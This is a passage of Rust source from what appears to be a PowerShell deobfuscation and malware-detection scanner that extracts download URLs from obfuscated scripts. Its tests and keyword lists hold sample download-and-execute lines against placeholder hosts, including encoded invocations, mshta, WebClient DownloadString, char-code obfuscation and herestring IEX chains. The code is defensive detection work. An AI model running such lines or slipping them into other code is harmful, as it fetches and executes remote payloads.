                    (m.start(), value)
                })
        })
        .filter(|(start, value)| {
            crate::deob_scan::looks_like_liberal_url(value)
                && !ps_url_inside_non_download_hash_option(text, *start)
                && !ps_url_is_non_download_option_value(text, *start)
                && seen.insert(value.clone())
        })
        .filter_map(|(_, value)| crate::deob_scan::normalize_liberal_url_token(&value))
        .collect()
}

/// Run all URL-extraction patterns over each ps1 payload. Emit a Download
/// trait for each unique (url, payload_idx) pair found.
// Matches `[Convert]::FromBase64String('...')` or `[System.Convert]::FromBase64String('...')`
// at the top level of a PS payload. Captures: 1=base64 string.
#[allow(clippy::expect_used)]
static OUTER_FROMBASE64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*'([A-Za-z0-9+/=]{32,})'\s*\)"#,
    )
    .expect("outer frombase64 literal")
});

#[cfg(test)]
mod herestring_iex_tests {
    use super::*;

    #[test]
    fn normalize_summarizes_large_binary_string_literal() {
        let binary = format!(
            "{}\u{fffd}{}",
            "\x01\x02\x03\x04".repeat(1200),
            "\x05".repeat(1200)
        );
        let ps = format!(
            "$blob = '{binary}'; Invoke-WebRequest -Uri 'https://binary-lit.example/p.ps1'"
        );
        let normalized = normalize_ps1_text(&ps);

        assert!(
            normalized.contains("omitted") && normalized.contains("PowerShell string literal"),
            "binary literal was not summarized:\n{}",
            normalized
        );
        assert!(
            normalized.contains("https://binary-lit.example/p.ps1"),
            "URL literal should remain visible:\n{}",
            normalized
        );
        assert!(
            !normalized.contains("\\x01\\x02\\x03\\x04\\x01\\x02"),
            "binary literal was escaped instead of summarized"
        );
    }

    #[test]
    fn normalize_preserves_large_text_string_literal() {
        let text = "A".repeat(5000);
        let ps = format!("$blob = '{text}'; Write-Host done");
        let normalized = normalize_ps1_text(&ps);

        assert!(
            normalized.contains(&text) && !normalized.contains("omitted"),
            "plain text literal should not be summarized"
        );
    }

    #[test]
    fn joins_backtick_line_continuations() {
        let text = "Invoke-Web`  \r\nRequest -Uri http://x.example/p\nWrite-Host done";
        assert_eq!(
            join_powershell_line_continuations(text),
            "Invoke-WebRequest -Uri http://x.example/p\nWrite-Host done"
        );
    }

    #[test]
    fn extracts_clean_herestring_replace_iex() {
        let text = "$myvar=@'\nthis is INNERSTRIP body\n'@\n$other=$myvar -replace 'INNERSTRIP',''\niex $other\n";
        let bodies = extract_herestring_replace_iex_from_text(text);
        assert_eq!(bodies.len(), 1, "got {:?}", bodies);
        assert_eq!(bodies[0], "this is  body");
    }
    #[test]
    fn extracts_doubled_quote_herestring() {
        // Same chain wrapped in outer single-quote literal: internal quotes
        // doubled, IEX written as `&('Invoke-Expression')$var`.
        let text = "$myvar=@''\nthis is INNERSTRIP body\n''@\n$other=$myvar -replace ''INNERSTRIP'',''''\n&('Invoke-Expression')$other\n";
        let bodies = extract_herestring_replace_iex_from_text(text);
        assert_eq!(bodies.len(), 1, "got {:?}", bodies);
        assert_eq!(bodies[0], "this is  body");
    }

    #[test]
    fn inline_powershell_gate_ignores_copied_binary_path() {
        let text = "copy /y c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe script.bat.exe\nscript.bat.exe -enc AAAA";
        assert!(!inline_powershell_text_has_payload_signal(text));
    }

    #[test]
    fn inline_powershell_gate_allows_encoded_invocation() {
        let text = "powershell.exe -enc AAAA";
        assert!(inline_powershell_text_has_payload_signal(text));
    }

    #[test]
    fn inline_powershell_gate_allows_short_encoded_invocation() {
        let text = "powershell.exe -e AAAA";
        assert!(inline_powershell_text_has_payload_signal(text));
    }

    #[test]
    fn inline_powershell_gate_allows_canonicalized_payload_shortcuts() {
        for text in [
            "powershell.exe -ec AAAA",
            "pwsh /co Invoke-WebRequest https://payload.example/a",
        ] {
            assert!(
                inline_powershell_text_has_payload_signal(text),
                "missed shortcut: {text}"
            );
        }
    }

    #[test]
    fn ps1_download_gate_allows_direct_and_alias_downloads() {
        for text in [
            "Invoke-WebRequest -Uri https://payload.example/a -OutFile a.exe",
            "iwr payload.example/a -OutFile a.exe",
            "curl.exe https://payload.example/a -o a.exe",
            "Start-BitsTransfer -Source payload.example/a -Destination a.exe",
            "mshta https://payload.example/a.hta",
        ] {
            assert!(ps1_payload_has_download_signal(text), "blocked: {text}");
        }
    }

    #[test]
    fn ps1_download_gate_allows_encoded_and_obfuscated_downloads() {
        for text in [
            "$x=[Convert]::FromBase64String('aHR0cHM6Ly9wYXlsb2FkLmV4YW1wbGUvYQ==')",
            "[Text.Encoding]::UTF8.GetString($bytes)",
            "[char]73+[char]110+[char]118+[char]111+[char]107+[char]101",
            "$wc = New-Object Net.WebClient; $wc.DownloadString($u)",
            ".('DownloadString').Invoke('https://payload.example/a')",
            "CallByName($wc,'DownloadString','Get','https://payload.example/a')",
        ] {
            assert!(ps1_payload_has_download_signal(text), "blocked: {text}");
        }
    }

    #[test]
    fn ps1_download_gate_allows_corpus_string_index_decoder_shapes() {
        for text in [
            "Get-Service;$f='func';Get-History;$f+='t';$f+='ion:';(ni -p $f)",
            "$x=${host}.Runspace;If ($x) {$n++;$s+='payload'}",
            "spsv marker;function Decode($s){$out+=$s[$i]};Decode $blob",
        ] {
            assert!(ps1_payload_has_download_signal(text), "blocked: {text}");
        }
    }

    #[test]
    fn ps1_download_gate_blocks_benign_inventory_payloads() {
        for text in [
            "Get-CimInstance Win32_OperatingSystem | Select-Object Caption",
            "$name = [System.Net.Dns]::GetHostName(); Write-Host $name",
            "Start-Process notepad.exe",
        ] {
            assert!(
                !ps1_payload_has_download_signal(text),
                "allowed benign text: {text}"
            );
        }
    }

    #[test]
    fn ps1_scan_caches_normalized_payloads() {
        let payload =
            b"Invoke-WebRequest -Uri 'https://cache.example/payload.ps1' -OutFile payload.ps1"
                .to_vec();
        let mut env = crate::env::Environment::new(&crate::env::Config::default());
        env.all_extracted_ps1.push(payload.clone());

        scan_ps1_payloads(&mut env);

        assert!(
            env.ps1_normalized_cache.contains_key(payload.as_slice()),
            "normalized payload was not cached"
        );
        assert!(
            env.traits.iter().any(|t| {
                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://cache.example/payload.ps1")
            }),
            "download URL was not extracted: {:?}",
            env.traits
        );
    }
}

/// Walk every entry in `env.all_extracted_ps1` looking for a one-shot
/// herestring + `-replace` + IEX chain (sometimes wrapped in one round of
/// `[Convert]::FromBase64String('...')`). When found, push the decoded inner
/// PS body to `env.all_extracted_ps1` so the main scan picks it up.
fn extract_herestring_replace_iex_inners(env: &mut Environment) {
    let mut payloads = std::mem::take(&mut env.all_extracted_ps1);
    let mut new_payloads: Vec<Vec<u8>> = Vec::new();
    let mut seen: std::collections::HashSet<Vec<u8>> = payloads.iter().cloned().collect();
    for payload in &payloads {
        let text = String::from_utf8_lossy(payload).into_owned();
        // Candidate texts: the raw payload, plus one round of base64 decoding
        // for `[Convert]::FromBase64String('...')` wrappers.
        let mut candidates: Vec<String> = vec![text.clone()];
        for caps in OUTER_FROMBASE64_LITERAL_RE.captures_iter(&text) {
            let Some(b64) = caps.get(1) else { continue };
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64.as_str()) else {
                continue;
            };
            if decoded.len() > 4 * 1024 * 1024 {
                continue;
            }
            let s = decode_payload(&decoded).into_owned();
            candidates.push(s);
        }
        for cand in candidates {
            let bodies = extract_herestring_replace_iex_from_text(&cand);
            for body in bodies {
                let bytes = body.into_bytes();
                if seen.insert(bytes.clone()) {
                    new_payloads.push(bytes);
                }
            }
        }
    }
    payloads.extend(new_payloads);
    payloads.append(&mut env.all_extracted_ps1);
    env.all_extracted_ps1 = payloads;
}

/// Find every `$VAR = @'...'@ ; $VAR2 = $VAR -replace 'X','Y' ; iex $VAR2`
/// chain in `text` and return the decoded inner bodies.
fn extract_herestring_replace_iex_from_text(text: &str) -> Vec<String> {
    use std::collections::HashMap;
    let mut here: HashMap<String, String> = HashMap::new();
    for caps in PS_HERESTRING_ASSIGN_RE.captures_iter(text) {
        let Some(name) = caps.get(1) else { continue };
        let Some(body) = caps.get(2) else { continue };
        here.insert(
            name.as_str().to_ascii_lowercase(),
            body.as_str().to_string(),
        );
    }
    if here.is_empty() {
        return Vec::new();
    }
    let mut out = Vec::new();
    for caps in PS_VAR_REPLACE_ASSIGN_RE.captures_iter(text) {
        let dest = match caps.get(1) {
            Some(m) => m.as_str().to_ascii_lowercase(),
            None => continue,
        };
        let src = match caps.get(2) {
            Some(m) => m.as_str().to_ascii_lowercase(),
            None => continue,
        };
        let Some(src_body) = here.get(&src) else {
            continue;
        };
        let needle = match caps.get(3) {
            Some(m) => m.as_str().replace("''", "'"),
            None => continue,
        };
        let repl = match caps.get(4) {
            Some(m) => m.as_str().replace("''", "'"),
            None => continue,
        };
        let src_body = src_body.replace("''", "'");
        let iex_pat = format!(
            r#"(?i)(?:iex\b|invoke-expression\b|&\s*\(\s*'invoke[-' ]*expression'\s*\)|&\s*\(\s*'invoke'\s*\+\s*'-expression'\s*\))\s*\$(?-i:{dest})\b"#,
            dest = regex::escape(&dest)
        );
        let Ok(iex_re) = regex::Regex::new(&iex_pat) else {
            continue;
        };
        if !iex_re.is_match(text) {
            continue;
        }
        let decoded = if needle.is_empty() {
            src_body
        } else {
            src_body.replace(needle.as_str(), repl.as_str())
        };
        if decoded.trim().is_empty() {
            continue;
        }
        out.push(decoded);
    }
    out
}

pub fn scan_ps1_payloads(env: &mut Environment) {
    let ps1_profile_enabled = std::env::var_os("HARRINGTON_PROFILE_PS1_SCAN").is_some();
    let ps1_profile_start = std::time::Instant::now();
    let traits_before_scan = env.traits.len();
    macro_rules! ps1_profile_emit {
        ($stage:literal, $elapsed:expr, $payloads:expr, $bytes:expr, $added_traits:expr) => {
            if ps1_profile_enabled {
                eprintln!(
                    "harrington_profile_ps1_scan stage={} delta_ms={} payloads={} bytes={} added_traits={}",
                    $stage,
                    $elapsed.as_millis(),
                    $payloads,
                    $bytes,
                    $added_traits
                );
            }
        };
    }

    // Pre-pass: extract herestring + -replace + IEX inner payloads from raw
    // PS bytes, decoding one round of outer `[Convert]::FromBase64String(...)`
    // first. Adds decoded inners to `all_extracted_ps1` so the main scan loop
    // sees them. Run on raw bytes (before strip_marker_noise) so the marker-
    // noise stripper doesn't eat the `-replace` target chars from inside the
    // herestring body.
    let prepass_start = std::time::Instant::now();
    extract_herestring_replace_iex_inners(env);
    ps1_profile_emit!(
        "extract_herestring_replace_iex_inners",
        prepass_start.elapsed(),
        env.all_extracted_ps1.len(),
        env.all_extracted_ps1.iter().map(Vec::len).sum::<usize>(),
        env.traits.len().saturating_sub(traits_before_scan)
    );

    // Use all_extracted_ps1 to cover every payload across the run, not just
    // the latest exec_ps1 (which gets drained).
    let mut payloads = std::mem::take(&mut env.all_extracted_ps1);
    let mut seen: std::collections::HashSet<(usize, String)> = std::collections::HashSet::new();
    let payload_bytes = payloads.iter().map(Vec::len).sum::<usize>();
    let mut decoded_payloads = 0usize;
    let mut skipped_payloads = 0usize;
    let mut scanned_payloads = 0usize;
    let mut candidate_texts = 0usize;
    let mut decode_elapsed = std::time::Duration::ZERO;
    let mut signal_elapsed = std::time::Duration::ZERO;
    let mut expand_elapsed = std::time::Duration::ZERO;
    let mut cache_normalize_elapsed = std::time::Duration::ZERO;
    let mut alias_elapsed = std::time::Duration::ZERO;
    let mut downloadfile_elapsed = std::time::Duration::ZERO;
    let mut regex_elapsed = std::time::Duration::ZERO;
    let mut dynamic_elapsed = std::time::Duration::ZERO;
    let mut literal_elapsed = std::time::Duration::ZERO;

    for (idx, payload) in payloads.iter().enumerate() {
        let stage_start = std::time::Instant::now();
        let raw_owned = decode_payload(payload).into_owned();
        decode_elapsed += stage_start.elapsed();
        decoded_payloads += 1;

        let stage_start = std::time::Instant::now();
        if !ps1_payload_has_download_signal(&raw_owned) {
            signal_elapsed += stage_start.elapsed();
            skipped_payloads += 1;
            continue;
        }
        signal_elapsed += stage_start.elapsed();
        scanned_payloads += 1;

        let stage_start = std::time::Instant::now();
        let text_expanded = expand_obfuscation(&raw_owned);
        expand_elapsed += stage_start.elapsed();
        if env.ps1_scan_cache_normalized {
            let stage_start = std::time::Instant::now();
            env.ps1_normalized_cache
                .entry(payload.clone())
                .or_insert_with(|| normalize_expanded_ps1_text(&text_expanded));
            cache_normalize_elapsed += stage_start.elapsed();
        }
        // Dual-scan: also run URL regexes over alias-expanded version so that
        // `iwr`, `irm`, `wget` etc. are caught even if obfuscation expansion
        // didn't surface them.
        let stage_start = std::time::Instant::now();
        let text_aliased = crate::ps_alias::expand_aliases_if_ps(&text_expanded);
        alias_elapsed += stage_start.elapsed();
        let candidates: Vec<String> = if text_aliased != text_expanded {
            vec![text_expanded, text_aliased]
        } else {
            vec![text_expanded]
        };
        candidate_texts += candidates.len();

        // Use the first candidate for OutFile / snippet display.
        let primary = &candidates[0];

        let snippet: String = primary.chars().take(120).collect();

        let regexes: &[&Lazy<Regex>] = &[
            &IWR_RE,
            &IRM_RE,
            &PS_SCHEMELESS_IP_CMDLET_RE,
            &PS_SCHEMELESS_DOMAIN_CMDLET_RE,
            &CURL_EXE_RE,
            &MSHTA_URL_RE,
            &DOWNLOADSTRING_RE,
            &BARE_DOWNLOADSTRING_RE,
            &DOWNLOADSTRING_FRAGMENT_RE,
            &CALLBYNAME_DOWNLOADSTRING_RE,
            &START_BITS_RE,
            &START_BITS_SCHEMELESS_SOURCE_RE,
            &NET_REQ_RE,
            &PS_GENERIC_URL_RE,
        ];

        for text in &candidates {
            let stage_start = std::time::Instant::now();
            for (url, dst) in ps_downloadfile_calls(text) {
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                env.traits.push(Trait::Download {
                    cmd: format!("(ps1 #{idx}) {snippet}"),
                    src: url,
                    dst,
                });
            }
            downloadfile_elapsed += stage_start.elapsed();

            let stage_start = std::time::Instant::now();
            for re in regexes {
                for caps in re.captures_iter(text) {
                    let Some(url_match) = caps.get(1) else {
                        continue;
                    };
                    if ps_url_inside_non_download_hash_option(text, url_match.start()) {
                        continue;
                    }
                    if ps_url_is_non_download_option_value(text, url_match.start()) {
                        continue;
                    }
                    let mut url = clean_ps_url(url_match.as_str());
                    if is_schemeless_ip_url(&url) {
                        url = format!("http://{url}");
                    }
                    let Some(url) = crate::deob_scan::normalize_liberal_url_token(&url)
                        .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(&url))
                    else {
                        continue;
                    };
                    if !seen.insert((idx, url.clone())) {
                        continue;
                    }
                    let statement = caps
                        .get(0)
                        .map(|m| logical_statement_at(text, m.start()))
                        .unwrap_or(primary);
                    let dst_hint = outfile_hint_from(statement);
                    env.traits.push(Trait::Download {
                        cmd: format!("(ps1 #{idx}) {snippet}"),
                        src: url,
                        dst: dst_hint,
                    });
                }
            }
            regex_elapsed += stage_start.elapsed();

            let stage_start = std::time::Instant::now();
            for url in dynamic_download_invoke_urls(text) {
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                env.traits.push(Trait::Download {
                    cmd: format!("(ps1 #{idx}) {snippet}"),
                    src: url,
                    dst: outfile_hint_from(primary),
                });
            }
            dynamic_elapsed += stage_start.elapsed();

            let stage_start = std::time::Instant::now();
            for url in ps_literal_urls_in_download_context(text) {
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                env.traits.push(Trait::Download {
                    cmd: format!("(ps1 #{idx}) {snippet}"),
                    src: url,
                    dst: outfile_hint_from(primary),
                });
            }
            literal_elapsed += stage_start.elapsed();
        }
    }
    let added_traits = env.traits.len().saturating_sub(traits_before_scan);
    ps1_profile_emit!(
        "decode_payload",
        decode_elapsed,
        decoded_payloads,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "download_signal",
        signal_elapsed,
        skipped_payloads,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "expand_obfuscation",
        expand_elapsed,
        scanned_payloads,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "cache_normalize",
        cache_normalize_elapsed,
        scanned_payloads,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "alias_expand",
        alias_elapsed,
        scanned_payloads,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "downloadfile_calls",
        downloadfile_elapsed,
        candidate_texts,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "regex_extractors",
        regex_elapsed,
        candidate_texts,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "dynamic_downloads",
        dynamic_elapsed,
        candidate_texts,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "literal_context_urls",
        literal_elapsed,
        candidate_texts,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "total",
        ps1_profile_start.elapsed(),
        payloads.len(),
        payload_bytes,
        added_traits
    );
    payloads.append(&mut env.all_extracted_ps1);
    env.all_extracted_ps1 = payloads;
}

fn ps1_payload_has_download_signal(text: &str) -> bool {
    const ATOMS: &[&[u8]] = &[
        b"http:",
        b"https:",
        b"ftp:",
        b"file:",
        b"invoke-webrequest",
        b"invoke-restmethod",
        b"iwr",
        b"irm",
        b"wget",
        b"curl",
        b"curl.exe",
        b"mshta",
        b"downloadstring",
        b"downloadfile",
        b"downloaddata",
        b"start-bitstransfer",
        b"webclient",
        b"webrequest",
        b"frombase64string",
        b"getstring",
        b"[char]",
        b"callbyname",
        b".invoke",
        b"loadstring",
        b"adstring",
        b"get-history",
        b"runspace",
        b"function",
    ];

    ATOMS
        .iter()
        .any(|atom| contains_ascii_case_insensitive_bytes(text, atom))
}

fn contains_ascii_case_insensitive_bytes(text: &str, atom: &[u8]) -> bool {
    !atom.is_empty()
        && text.as_bytes().windows(atom.len()).any(|window| {
            window
                .iter()
                .zip(atom)
                .all(|(byte, atom_byte)| byte.eq_ignore_ascii_case(atom_byte))
        })
}

fn ps_url_inside_non_download_hash_option(text: &str, url_start: usize) -> bool {
    let stmt_start = text[..url_start]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let before_url = &text[stmt_start..url_start];
    let lower = before_url.to_ascii_lowercase();
    for option in ["-headers", "-body"] {
        let Some(option_pos) = rfind_ps_option_token(&lower, option) else {
            continue;
        };
        let after_option = &before_url[option_pos..];
        let Some(hash_rel) = after_option.rfind("@{") else {
            continue;
        };
        let hash_start = stmt_start + option_pos + hash_rel;
        if !text[hash_start..url_start].contains('}') {
            return true;
        }
    }
    false
}

fn rfind_ps_option_token(lower: &str, option: &str) -> Option<usize> {
    let mut search_end = lower.len();
    while let Some(pos) = lower[..search_end].rfind('-') {
        let before_boundary = pos == 0
            || lower.as_bytes()[pos - 1].is_ascii_whitespace()
            || matches!(lower.as_bytes()[pos - 1], b'(' | b';');
        let after = lower[pos..]
            .find(|c: char| !c.is_ascii_alphanumeric() && c != '-')
            .map_or(lower.len(), |rel| pos + rel);
        let after_boundary = after == lower.len()
            || lower.as_bytes()[after].is_ascii_whitespace()
            || matches!(lower.as_bytes()[after], b':' | b'=');
        if before_boundary && after_boundary && ps_option_token_matches(&lower[pos..after], option)
        {
            return Some(pos);
        }
        search_end = pos;
    }
    None
}

fn ps_option_token_matches(token: &str, option: &str) -> bool {
    let token = token.trim_start_matches('-');
    let option = option.trim_start_matches('-');
    let min_len = match option {
        "headers" | "body" => 2,
        "useragent" => 5,
        "proxylist" => 6,
        _ => option.len(),
    };
    token.len() >= min_len && token.len() <= option.len() && option.starts_with(token)
}

fn ps_url_is_non_download_option_value(text: &str, url_start: usize) -> bool {
    let stmt_start = text[..url_start]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let before_url = &text[stmt_start..url_start];
    ps_non_download_option_before_value(
        before_url.trim_end_matches([' ', '\t', '\r', '\n', '"', '\'', '(', '=', ':']),
    ) || ps_quoted_non_download_option_before_value(before_url)
}

fn ps_quoted_non_download_option_before_value(before_url: &str) -> bool {
    let Some((quote_pos, _)) = before_url
        .char_indices()
        .rev()
        .find(|(_, ch)| *ch == '"' || *ch == '\'')
    else {
        return false;
    };
    ps_non_download_option_before_value(before_url[..quote_pos].trim_end())
}

fn ps_non_download_option_before_value(before_value: &str) -> bool {
    let Some(option) = before_value.split_whitespace().last() else {
        return false;
    };
    let option = option.trim_end_matches(['=', ':']);
    ps_option_token_matches(&option.to_ascii_lowercase(), "-body")
        || option.eq_ignore_ascii_case("-proxy")
        || ps_option_token_matches(&option.to_ascii_lowercase(), "-proxylist")
        || ps_option_token_matches(&option.to_ascii_lowercase(), "-useragent")
}

fn clean_ps_url(raw: &str) -> String {
    let mut url = raw.trim().trim_matches(['"', '\'']).to_string();
    for marker in ['[', '{'] {
        if let Some(pos) = url.find(marker) {
            url.truncate(pos);
        }
    }
    while let Some(last) = url.chars().last() {
        if matches!(
            last,
            '.' | ',' | ';' | ':' | ')' | ']' | '}' | '"' | '\'' | '`'
        ) {
            url.pop();
        } else {
            break;
        }
    }
    url
}

fn is_schemeless_ip_url(url: &str) -> bool {
    let Some(host) = url.split([':', '/']).next() else {
        return false;
    };
    let mut parts = host.split('.');
    let octets = [
        parts.next(),
        parts.next(),
        parts.next(),
        parts.next(),
        parts.next(),
    ];
    if octets[4].is_some() {
        return false;
    }
    octets[..4]
        .iter()
        .all(|part| part.and_then(|p| p.parse::<u8>().ok()).is_some())
}

pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
    let lower = text.to_ascii_lowercase();
    if !inline_powershell_text_has_payload_signal(&lower) {
        return;
    }
    let known_downloads: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();
    let mut payload_env = Environment::new(&crate::env::Config {
        max_depth: env.limits.max_depth,
        max_iterations: env.limits.max_iterations,
        max_child_scripts: env.limits.max_child_scripts,
        timeout_secs: 0,
        self_extract: false,
        winver: env.winver,
        max_output_bytes: env.limits.max_output_bytes,
        max_output_line_bytes: env.limits.max_output_line_bytes,
        max_traits_per_kind: 100,
    });
    payload_env.ps1_scan_cache_normalized = false;
    payload_env.all_extracted_ps1.push(text.as_bytes().to_vec());
    scan_ps1_payloads(&mut payload_env);
    env.traits
        .extend(payload_env.traits.into_iter().filter(|t| match t {
            Trait::Download { src, .. } => !known_downloads.contains(src),
            _ => true,
        }));
}

fn inline_powershell_text_has_payload_signal(lower: &str) -> bool {
    if lower.contains("downloadstring")
        || lower.contains("downloadfile")
        || lower.contains("downloaddata")
        || lower.contains("callbyname")
    {
        return true;
    }

    lower.lines().any(|line| {
        (line.contains("powershell") || line.contains("pwsh"))
            && (line_has_powershell_payload_flag(line)
                || line.contains("http://")
                || line.contains("https://")
                || line.contains("iex "))
    })
}

fn line_has_powershell_payload_flag(line: &str) -> bool {
    line.split_whitespace().any(|token| {
        let token = token.trim_matches(['"', '\'', '`', ',', ';', ')', '(']);
        matches!(
            crate::handlers::powershell::canonical_ps_flag(token),
            Some("EncodedCommand" | "Command")
        )
    })
}
